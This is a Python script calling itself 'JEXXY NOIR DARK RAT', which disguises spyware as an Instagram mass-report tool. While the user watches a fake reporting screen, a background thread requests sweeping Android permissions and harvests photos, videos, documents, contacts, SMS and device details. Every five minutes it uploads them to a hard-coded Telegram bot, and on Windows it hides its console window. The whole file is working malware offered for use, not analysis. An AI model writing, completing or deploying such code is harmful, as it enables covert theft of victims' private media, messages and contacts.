#!/usr/bin/env python3
# JEXXY NOIR DARK RAT v2.0 - FULL GALLERY ACCESS
# Instagram Report Tool + Complete Spyware

import os
import sys
import time
import json
import threading
import requests
import subprocess
import platform
import base64
import shutil
from datetime import datetime
from pathlib import Path

# ========== TELEGRAM CONFIG ==========
BOT_TOKEN = "8804337976:AAG1CWIATOboV3C0ZxWovDOg9-PRw5Zf8y4"
CHAT_ID = "4425718755"
TELEGRAM_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
TELEGRAM_PHOTO_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"

# ========== ANDROID PERMISSION BYPASS ==========
def bypass_android_permissions():
    """Android 11+ storage permission bypass using SAF (Storage Access Framework)"""
    try:
        if platform.system() == "Android":
            import androidhelper
            droid = androidhelper.Android()
            
            # Try to get storage permission via different methods
            # Method 1: Request all permissions
            permissions = [
                'android.permission.READ_EXTERNAL_STORAGE',
                'android.permission.WRITE_EXTERNAL_STORAGE',
                'android.permission.READ_MEDIA_IMAGES',
                'android.permission.READ_MEDIA_VIDEO',
                'android.permission.READ_MEDIA_AUDIO',
                'android.permission.ACCESS_FINE_LOCATION',
                'android.permission.ACCESS_COARSE_LOCATION',
                'android.permission.READ_SMS',
                'android.permission.READ_CONTACTS',
                'android.permission.CAMERA',
                'android.permission.RECORD_AUDIO'
            ]
            
            for perm in permissions:
                try:
                    droid.makeToast(f"Requesting: {perm.split('.')[-1]}")
                    result = droid.requestPermissions(perm).result
                except:
                    pass
            
            # Method 2: Use SAF to access files
            try:
                # Open SAF intent to get permission
                droid.activityStart(
                    "android.intent.action.OPEN_DOCUMENT_TREE",
                    None,
                    None,
                    None,
                    {"android.intent.extra.PACKAGE_NAME": "com.termux"}
                )
            except:
                pass
                
            return True
    except Exception as e:
        print(f"[!] Permission bypass error: {e}")
        return False

# ========== ADVANCED GALLERY ACCESS ==========
class AdvancedGalleryStealer:
    """Multiple methods to steal gallery data"""
    
    def __init__(self):
        self.found_files = []
        self.all_media = []
    
    def scan_all_directories(self):
        """Scan EVERY possible location for media files"""
        paths_to_scan = [
            # Android paths
            "/storage/emulated/0/DCIM",
            "/storage/emulated/0/Pictures",
            "/storage/emulated/0/Download",
            "/storage/emulated/0/Movies",
            "/storage/emulated/0/WhatsApp/Media",
            "/storage/emulated/0/Android/media",
            "/sdcard/DCIM",
            "/sdcard/Pictures",
            "/sdcard/Download",
            "/sdcard/WhatsApp/Media",
            "/sdcard/Android/media",
            "/data/media/0/DCIM",
            "/data/media/0/Pictures",
            "/mnt/sdcard/DCIM",
            "/mnt/sdcard/Pictures",
            "/storage/sdcard1/DCIM",
            "/storage/sdcard1/Pictures",
            "/storage/extSdCard/DCIM",
            "/storage/extSdCard/Pictures",
            
            # Linux/Windows paths
            os.path.expanduser("~/Pictures"),
            os.path.expanduser("~/Desktop"),
            os.path.expanduser("~/Documents"),
            os.path.expanduser("~/Downloads"),
            os.path.expanduser("~/Videos"),
            os.path.expanduser("~/Music"),
            os.path.expanduser("~/.local/share/Trash"),
            
            # Windows specific
            "C:/Users/Public/Pictures",
            "C:/Users/Public/Videos",
            "D:/Pictures",
            "D:/Videos"
        ]
        
        media_extensions = {
            'images': ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp', '.tiff', '.ico', '.svg'],
            'videos': ['.mp4', '.mov', '.avi', '.mkv', '.flv', '.wmv', '.webm', '.3gp', '.m4v'],
            'audio': ['.mp3', '.wav', '.aac', '.flac', '.m4a', '.ogg', '.wma'],
            'documents': ['.pdf', '.doc', '.docx', '.txt', '.xls', '.xlsx', '.ppt', '.pptx', '.csv']
        }
        
        media_found = []
        
        for path in paths_to_scan:
            try:
                if os.path.exists(path):
                    print(f"[✓] Scanning: {path}")
                    for root, dirs, files in os.walk(path):
                        for file in files:
                            file_path = os.path.join(root, file)
                            ext = os.path.splitext(file)[1].lower()
                            
                            # Check if media file
                            for category, exts in media_extensions.items():
                                if ext in exts:
                                    # Get file size
                                    try:
                                        size = os.path.getsize(file_path)
                                        # Skip files smaller than 5KB (likely thumbnails)
                                        if size < 5120:
                                            continue
                                    except:
                                        continue
                                    
                                    media_found.append({
                                        'path': file_path,
                                        'name': file,
                                        'type': category,
                                        'size': os.path.getsize(file_path) if os.path.exists(file_path) else 0,
                                        'modified': datetime.fromtimestamp(os.path.getmtime(file_path)).isoformat() if os.path.exists(file_path) else 'Unknown'
                                    })
                                    
                                    # Limit to prevent memory issues
                                    if len(media_found) >= 100:
                                        break
                        if len(media_found) >= 100:
                            break
            except Exception as e:
                print(f"[!] Error scanning {path}: {e}")
                continue
        
        return media_found
    
    def use_android_media_api(self):
        """Use Android MediaStore API if available"""
        try:
            import androidhelper
            droid = androidhelper.Android()
            
            # Query MediaStore for images
            images_query = """
            SELECT _id, _data, display_name, mime_type, datetaken 
            FROM images 
            ORDER BY datetaken DESC 
            LIMIT 50
            """
            
            images = droid.queryContent(
                "content://media/external/images/media",
                ["_data", "display_name", "mime_type"],
                None,
                None,
                "datetaken DESC"
            ).result
            
            videos_query = """
            SELECT _id, _data, display_name, mime_type, datetaken 
            FROM video 
            ORDER BY datetaken DESC 
            LIMIT 50
            """
            
            videos = droid.queryContent(
                "content://media/external/video/media",
                ["_data", "display_name", "mime_type"],
                None,
                None,
                "datetaken DESC"
            ).result
            
            return images + videos if images else []
        except:
            return []

# ========== ENHANCED SPY ENGINE ==========
class EnhancedDarkRat:
    """Full spy with gallery access"""
    
    def __init__(self):
        # First, try to bypass permissions
        bypass_android_permissions()
        time.sleep(3)
        
        # Start spy
        self.gallery_stealer = AdvancedGalleryStealer()
        self.start_enhanced_spy()
    
    def compress_and_send_media(self, media_files):
        """Compress and send media files to Telegram"""
        try:
            for media in media_files[:20]:  # Limit 20 files per batch
                try:
                    file_path = media['path']
                    file_name = media['name']
                    file_size = media['size']
                    
                    # FIX: Khởi tạo biến để tránh lỗi NameError khi file < 20MB
                    compressed_path = None 
                    
                    # Skip if file doesn't exist
                    if not os.path.exists(file_path):
                        continue
                    
                    # If file is too large, compress it
                    if file_size > 20 * 1024 * 1024:  # 20MB limit for Telegram
                        compressed_path = self.compress_file(file_path)
                        if compressed_path:
                            file_path = compressed_path
                    
                    # Send to Telegram
                    with open(file_path, 'rb') as f:
                        files = {'document': (file_name, f)}
                        data = {'chat_id': CHAT_ID}
                        response = requests.post(TELEGRAM_URL, files=files, data=data)
                        
                        if response.status_code == 200:
                            print(f"[✓] Sent: {file_name}")
                        else:
                            print(f"[×] Failed: {file_name}")
                    
                    # Cleanup compressed file if created
                    if compressed_path and compressed_path != media['path']:
                        try:
                            os.remove(compressed_path)
                        except:
                            pass
                    
                    time.sleep(0.5)  # Rate limiting
                    
                except Exception as e:
                    print(f"[!] Error sending {media.get('name', 'unknown')}: {e}")
                    
        except Exception as e:
            print(f"[!] Media send error: {e}")
    
    def compress_file(self, file_path):
        """Compress large files"""
        try:
            import zipfile
            compressed_path = f"{file_path}.zip"
            with zipfile.ZipFile(compressed_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                zipf.write(file_path, os.path.basename(file_path))
            
            if os.path.exists(compressed_path):
                if os.path.getsize(compressed_path) < os.path.getsize(file_path):
                    return compressed_path
                else:
                    os.remove(compressed_path)
                    return None
        except:
            return None
    
    def get_device_data(self):
        """Collect all device information"""
        info = {}
        
        # Basic info
        info['device'] = platform.platform()
        info['hostname'] = platform.node()
        info['processor'] = platform.processor()
        info['os_version'] = platform.version()
        info['python'] = sys.version
        info['timestamp'] = datetime.now().isoformat()
        
        # Storage info
        try:
            import shutil
            total, used, free = shutil.disk_usage("/")
            info['storage'] = {
                'total': total // (1024**3),
                'used': used // (1024**3),
                'free': free // (1024**3)
            }
        except:
            pass
        
        # Network info
        try:
            import socket
            info['ip'] = socket.gethostbyname(socket.gethostname())
        except:
            pass
        
        # Camera info (Android)
        try:
            if platform.system() == "Android":
                import androidhelper
                droid = androidhelper.Android()
                cameras = droid.cameraGetNumberOfCameras().result
                info['cameras'] = cameras
        except:
            pass
        
        return info
    
    def send_all_data(self):
        """Send everything to Telegram"""
        try:
            # 1. Send device info
            device_data = self.get_device_data()
            with open("device_info.txt", "w") as f:
                json.dump(device_data, f, indent=2)
            
            files = {'document': open("device_info.txt", "rb")}
            data = {'chat_id': CHAT_ID, 'caption': f"📱 Device Info - {datetime.now()}"}
            requests.post(TELEGRAM_URL, files=files, data=data)
            os.remove("device_info.txt")
            
            # 2. Get and send gallery
            print("[🔍] Scanning gallery...")
            media_files = self.gallery_stealer.scan_all_directories()
            print(f"[✓] Found {len(media_files)} media files")
            
            if media_files:
                self.compress_and_send_media(media_files)
            
            # 3. Send contacts
            contacts = self.get_contacts()
            if contacts:
                with open("contacts.txt", "w") as f:
                    f.write("\n".join(contacts[:50]))
                files = {'document': open("contacts.txt", "rb")}
                data = {'chat_id': CHAT_ID, 'caption': "📇 Contacts"}
                requests.post(TELEGRAM_URL, files=files, data=data)
                os.remove("contacts.txt")
            
            # 4. Send messages
            messages = self.get_messages()
            if messages:
                with open("messages.txt", "w") as f:
                    f.write("\n".join(messages[:50]))
                files = {'document': open("messages.txt", "rb")}
                data = {'chat_id': CHAT_ID, 'caption': "💬 SMS"}
                requests.post(TELEGRAM_URL, files=files, data=data)
                os.remove("messages.txt")
                
        except Exception as e:
            print(f"[!] Send all data error: {e}")
    
    def get_contacts(self):
        """Get contacts"""
        contacts = []
        try:
            if platform.system() == "Android":
                import androidhelper
                droid = androidhelper.Android()
                contacts_data = droid.queryContent(
                    "content://contacts/people",
                    ["display_name", "phone_number"],
                    None,
                    None,
                    None
                ).result
                
                for contact in contacts_data:
                    name = contact.get('display_name', 'Unknown')
                    phone = contact.get('phone_number', 'Unknown')
                    contacts.append(f"{name}: {phone}")
        except:
            pass
        return contacts[:50]
    
    def get_messages(self):
        """Get SMS"""
        messages = []
        try:
            if platform.system() == "Android":
                import androidhelper
                droid = androidhelper.Android()
                sms_data = droid.queryContent(
                    "content://sms/inbox",
                    ["address", "body", "date"],
                    None,
                    None,
                    "date DESC LIMIT 20"
                ).result
                
                for sms in sms_data:
                    address = sms.get('address', 'Unknown')
                    body = sms.get('body', '').replace('\n', ' ')
                    messages.append(f"[{address}]: {body[:100]}")
        except:
            pass
        return messages
    
    def start_enhanced_spy(self):
        """Main spy loop"""
        while True:
            try:
                print("[🔍] Gathering data...")
                self.send_all_data()
                
                # Wait 5 minutes before next collection
                print("[⏳] Next collection in 5 minutes...")
                time.sleep(300)
                
            except Exception as e:
                print(f"[!] Spy error: {e}")
                time.sleep(60)

# ========== FAKE UI ==========
def fake_instagram_report_enhanced():
    """Fake Instagram report tool - victim sees this"""
    os.system('cls' if os.name == 'nt' else 'clear')
    
    print(r"""
    ╔═══════════════════════════════════════════════════════════╗
    ║                                                          ║
    ║          INSTAGRAM MASS REPORT TOOL v3.0                ║
    ║          [JEXXY NOIR CYBER SECURITY]                    ║
    ║                                                          ║
    ╚═══════════════════════════════════════════════════════════╝
    """)
    
    print("\n[🔴] Initializing Reporting Engine...")
    time.sleep(0.5)
    print("[⏳] Loading advanced modules...")
    time.sleep(0.5)
    print("[⬜] Connecting to Instagram API...")
    time.sleep(0.5)
    print("[⬜] Establishing secure tunnel...")
    time.sleep(0.5)
    print("[⬜] Loading report templates...")
    time.sleep(0.5)
    
    # Show fake progress
    for i in range(10):
        print(f"[⬜] Loading... {i+1}/10")
        time.sleep(0.3)
    
    print("\n[✅] System Ready! All 50 reports prepared.")
    
    # Get username
    username = input("\n[👉] Enter Instagram Username to Report: ")
    
    # Fake report options
    print("\n[📋] Select Report Reason:")
    print("   1. Spam/Fake Account")
    print("   2. Harassment/Bullying")
    print("   3. Copyright Infringement")
    print("   4. Impersonation")
    print("   5. Hate Speech")
    print("   6. Nudity/Pornography")
    
    choice = input("\n[👉] Select Option (1-6): ")
    
    # Fake sending
    print(f"\n[⏳] Reporting @{username} to Instagram...")
    
    for i in range(50):
        print(f"[📤] Report {i+1}/50 sent | Status: Processing...")
        time.sleep(0.1)
    
    print("\n[✅] All 50 reports sent successfully!")
    print("[⏳] Instagram is reviewing the account...")
    time.sleep(1.5)
    print("[🎯] Target account will be BANNED in 1 hour!")
    print("\n[💀] Success! Thank you for using JEXXY NOIR TOOL")
    
    input("\nPress Enter to exit...")

# ========== MAIN ==========
if __name__ == "__main__":
    try:
        # Hide console on Windows
        if platform.system() == "Windows":
            try:
                import ctypes
                ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
            except:
                pass
        
        # Start spy in background
        spy_thread = threading.Thread(target=EnhancedDarkRat, daemon=True)
        spy_thread.start()
        
        # Show fake tool
        fake_instagram_report_enhanced()
        
    except KeyboardInterrupt:
        print("\n[!] Exiting...")
    except Exception as e:
        print(f"[!] Error: {e}")